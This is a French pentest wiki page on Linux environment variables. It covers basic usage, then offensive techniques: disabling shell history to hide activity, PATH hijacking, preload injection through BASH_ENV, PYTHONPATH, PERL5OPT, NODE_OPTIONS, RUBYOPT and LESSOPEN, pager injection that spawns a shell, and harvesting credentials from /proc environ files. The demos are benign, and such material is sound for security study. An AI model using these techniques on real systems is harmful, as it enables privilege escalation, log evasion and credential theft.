# Variables d’environnement Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Les variables globales **seront** héritées par les **processus enfants**.

Vous pouvez créer une variable globale pour votre session actuelle en exécutant :
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Cette variable sera accessible par vos sessions actuelles et leurs processus enfants.

Vous pouvez **supprimer** une variable en exécutant :
```bash
unset MYGLOBAL
```
## Variables locales

Les **variables locales** sont accessibles uniquement par le **shell/script actuel**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lister les variables actuelles
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Le contenu de `/proc/*/environ` est **séparé par des caractères NUL**, ces variantes sont donc généralement plus faciles à lire :
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Si vous recherchez des **credentials** ou une **configuration de service intéressante** dans des environnements hérités, consultez également [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Variables courantes

Source : [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – l’affichage utilisé par **X**. Cette variable est généralement définie sur **:0.0**, ce qui signifie le premier affichage sur l’ordinateur actuel.
- **EDITOR** – l’éditeur de texte préféré de l’utilisateur.
- **HISTFILESIZE** – le nombre maximal de lignes contenues dans le fichier d’historique.
- **HISTSIZE** – le nombre de lignes ajoutées au fichier d’historique lorsque l’utilisateur termine sa session.
- **HOME** – votre répertoire personnel.
- **HOSTNAME** – le nom d’hôte de l’ordinateur.
- **LANG** – votre langue actuelle.
- **MAIL** – l’emplacement de la boîte aux lettres de l’utilisateur. Généralement **/var/spool/mail/USER**.
- **MANPATH** – la liste des répertoires dans lesquels rechercher les pages de manuel.
- **OSTYPE** – le type de système d’exploitation.
- **PS1** – l’invite par défaut dans bash.
- **PATH** – contient le chemin de tous les répertoires qui hébergent les fichiers binaires que vous souhaitez exécuter en indiquant simplement le nom du fichier, et non son chemin relatif ou absolu.
- **PWD** – le répertoire de travail actuel.
- **SHELL** – le chemin vers le shell de commandes actuel (par exemple, **/bin/bash**).
- **TERM** – le type de terminal actuel (par exemple, **xterm**).
- **TZ** – votre fuseau horaire.
- **USER** – votre nom d’utilisateur actuel.

## Variables intéressantes pour le hacking

Toutes les variables ne sont pas aussi utiles les unes que les autres. Du point de vue offensif, donnez la priorité aux variables qui modifient les **search paths**, les **startup files**, le **dynamic linker behavior** ou l’**audit/logging**.

### **HISTFILESIZE**

Modifiez la **valeur de cette variable à 0** afin que, lorsque vous **terminez votre session**, le **fichier d’historique** (\~/.bash_history) soit **tronqué à 0 ligne**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Modifiez la **valeur de cette variable à 0**, afin que les commandes **ne soient pas conservées dans l’historique en mémoire** et ne soient pas réécrites dans le **fichier d’historique** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Si la **valeur de cette variable est définie sur `ignorespace` ou `ignoreboth`**, toute commande précédée d’une espace supplémentaire ne sera pas enregistrée dans l’historique.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Dirigez le **fichier d’historique** vers **`/dev/null`** ou désactivez-le complètement. Cette méthode est généralement plus fiable que de modifier uniquement la taille de l’historique.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Les processus utiliseront le **proxy** déclaré ici pour se connecter à Internet via **http ou https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy` : proxy par défaut pour les outils/protocoles qui le prennent en charge.
- `no_proxy` : liste d’exclusion (hôtes/domaines/CIDR) qui doivent se connecter directement.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Les variantes en minuscules et en majuscules peuvent être utilisées selon l’outil (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Les processus feront confiance aux certificats indiqués dans **ces variables d’environnement**. Cela est utile pour que des outils tels que **`curl`**, **`git`**, les clients HTTP Python ou les gestionnaires de paquets fassent confiance à une CA contrôlée par l’attaquant (par exemple, pour qu’un proxy d’interception semble légitime).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Si un wrapper/script privilégié exécute des commandes **sans chemins absolus**, le **premier répertoire contrôlé par l’attaquant** dans `PATH` est prioritaire. C’est le principe derrière de nombreux **PATH hijacks** dans `sudo`, les tâches cron, les wrappers shell et les helpers SUID personnalisés. Recherchez `env_keep+=PATH`, un `secure_path` faible ou des wrappers qui appellent `tar`, `service`, `cp`, `python`, etc. par leur nom.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Pour les chaînes complètes d’élévation de privilèges exploitant `PATH`, consultez [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` n’est pas seulement une référence de répertoire : de nombreux outils chargent automatiquement des **dotfiles**, des **plugins** et de la **configuration par utilisateur** depuis `$HOME` ou `$XDG_CONFIG_HOME`. Si un workflow privilégié conserve ces valeurs, la **config injection** peut être plus facile que le **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Les cibles intéressantes incluent `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, ainsi que des fichiers spécifiques à certains outils comme `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ces variables influencent l’**éditeur de liens dynamique** :

- `LD_PRELOAD` : force le chargement préalable d’objets partagés supplémentaires.
- `LD_LIBRARY_PATH` : ajoute en tête les répertoires de recherche des bibliothèques.
- `LD_AUDIT` : charge des bibliothèques d’audit qui observent le chargement des bibliothèques et la résolution des symboles.

Elles sont extrêmement utiles pour le **hooking**, l’**instrumentation** et la **privilege escalation** si une commande privilégiée les conserve. En mode **secure-execution** (`AT_SECURE`, par exemple avec setuid/setgid/capabilities), le loader supprime ou restreint nombre de ces variables. Toutefois, les bugs de parsing présents à cette étape précoce du loader restent très impactants, car ils s’exécutent **avant** le programme cible.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` modifie le comportement initial de glibc (par exemple, les paramètres de l’allocateur) et est très utile dans les exploit labs. Il est également important du point de vue de la sécurité, car le **dynamic loader l’analyse très tôt**. La vulnérabilité **Looney Tunables** de 2023 a rappelé qu’une simple variable d’environnement analysée par le loader peut devenir une **primitive d’élévation de privilèges locale** contre des programmes SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Si **Bash** est lancé de manière **non interactive**, il vérifie `BASH_ENV` et charge ce fichier avant d’exécuter le script cible. Lorsque Bash est invoqué en tant que `sh`, ou en mode interactif de type POSIX, `ENV` peut également être consulté. Il s’agit d’une méthode classique pour transformer un shell wrapper en exécution de code si l’environnement est contrôlé par l’attaquant.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignore ces fichiers de démarrage lorsque les **identifiants réels/effectifs diffèrent** ; `-p` préserve l’identifiant effectif, mais n’active pas ces fichiers de démarrage. Le comportement exact dépend donc de la manière dont le wrapper invoque le shell. Soyez prudent avec les wrappers privilégiés qui appellent `setuid()`/`setgid()` **avant** de lancer Bash : une fois que les identifiants correspondent à nouveau, Bash peut faire confiance à `BASH_ENV`, `ENV` et à l’état associé du shell, qui seraient autrement ignorés.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Ces variables modifient le démarrage de Python :

- `PYTHONPATH` : ajoute des chemins de recherche d’importation au début.
- `PYTHONHOME` : déplace l’arborescence de la bibliothèque standard.
- `PYTHONSTARTUP` : exécute un fichier avant l’invite interactive.
- `PYTHONINSPECT=1` : passe en mode interactif après l’exécution d’un script.

Elles sont utiles contre les scripts de maintenance, les debuggers, les shells et les wrappers qui appellent Python avec un environnement contrôlable. `python -E` et `python -I` ignorent toutes les variables `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Un exemple récent dans le monde réel est le LPE **needrestart** de 2024 sur les systèmes Ubuntu/Debian : le scanner détenu par root copiait le `PYTHONPATH` d'un processus non privilégié depuis `/proc/<PID>/environ`, puis exécutait Python. L'exploit publié plaçait `importlib/__init__.so` dans le chemin contrôlé par l'attaquant, afin que Python exécute le code de l'attaquant pendant sa propre initialisation, avant même que le script codé en dur de l'helper n'ait d'importance.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl possède des variables de démarrage tout aussi utiles :

- `PERL5LIB` : préfixer les répertoires de bibliothèques.
- `PERL5OPT` : injecter des options comme si elles figuraient sur chaque ligne de commande `perl`.

Cela peut forcer le **chargement automatique de modules** ou modifier le comportement de l'interpréteur avant que le script cible ne fasse quoi que ce soit d'intéressant. Perl ignore ces variables dans les contextes **taint / setuid / setgid**, mais elles restent très importantes pour les wrappers exécutés normalement en tant que root, les tâches CI, les installateurs et les règles sudoers personnalisées.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` ajoute des **options CLI de Node.js** au début de chaque processus `node` qui hérite de l'environnement. Cela le rend utile contre les wrappers, les tâches CI, les helpers Electron et les règles sudo qui finissent par invoquer Node. Les options les plus intéressantes offensivement sont généralement :

- `--require <file>` : précharge un fichier CommonJS avant le script cible.
- `--import <module>` : précharge un module ES avant le script cible.

Node rejette certaines options dangereuses dans `NODE_OPTIONS`, mais `--require` et `--import` sont explicitement autorisées et sont traitées **avant** les arguments habituels de la ligne de commande.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Pour les chaînes de gadgets distantes qui définissent indirectement `NODE_OPTIONS` (par exemple, de la prototype-pollution vers la RCE), consultez [cette autre page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby offre la même catégorie d’abus au démarrage :

- `RUBYLIB` : ajoute des répertoires au début du chemin de chargement de Ruby.
- `RUBYOPT` : injecte des options de ligne de commande telles que `-r` dans chaque invocation de `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Les vulnérabilités de **needrestart** découvertes en 2024 ont montré qu’il ne s’agissait pas seulement d’une astuce de lab : le même helper détenu par root qui était vulnérable à l’abus de `PYTHONPATH` pouvait également être contraint d’exécuter Ruby avec un `RUBYLIB` contrôlé par l’attaquant, en chargeant `enc/encdb.so` depuis un répertoire contrôlé par l’attaquant.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Certains outils ne lisent pas simplement un chemin depuis l’environnement ; ils transmettent la valeur à un **shell**, un **éditeur** ou un **préprocesseur d’entrée**. Cela rend les variables suivantes particulièrement intéressantes lorsqu’un wrapper privilégié exécute `git`, `man`, `less` ou des visionneuses de texte similaires :

- `PAGER`, `MANPAGER`, `GIT_PAGER` : choisissent la commande du pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR` : choisissent la commande de l’éditeur, souvent avec des arguments.
- `LESSOPEN`, `LESSCLOSE` : définissent les préprocesseurs et postprocesseurs exécutés lorsque `less` ouvre un fichier.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git prend également en charge l’**injection de configuration uniquement via l’environnement** sans toucher au disque grâce à `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` et `GIT_CONFIG_VALUE_<n>` :
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
D’un point de vue post-exploitation, gardez également à l’esprit que les environnements hérités contiennent souvent des **credentials**, des **proxy settings**, des **service tokens** ou des **cloud keys**. Consultez [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) pour rechercher `/proc/<PID>/environ` et `Environment=` dans `systemd`.

### PS1

Modifiez l’apparence de votre invite de commande.

[**Voici un exemple**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root :

![PERL5OPT & PERL5LIB - PS1 : Voici un exemple](<../images/image (897).png>)

Utilisateur standard :

![PERL5OPT & PERL5LIB - PS1 : Un, deux et trois jobs exécutés en arrière-plan](<../images/image (740).png>)

Un, deux et trois jobs exécutés en arrière-plan :

![PERL5OPT & PERL5LIB - PS1 : Un, deux et trois jobs exécutés en arrière-plan](<../images/image (145).png>)

Un job en arrière-plan, un job arrêté et la dernière commande ne s’est pas terminée correctement :

![PERL5OPT & PERL5LIB - PS1 : Un job en arrière-plan, un job arrêté et la dernière commande ne s’est pas terminée correctement](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Fichiers de démarrage de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - page du manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs dans needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentation CLI de Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variables d’environnement courantes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911 : Looney Tunables - Local Privilege Escalation dans le ld.so de glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
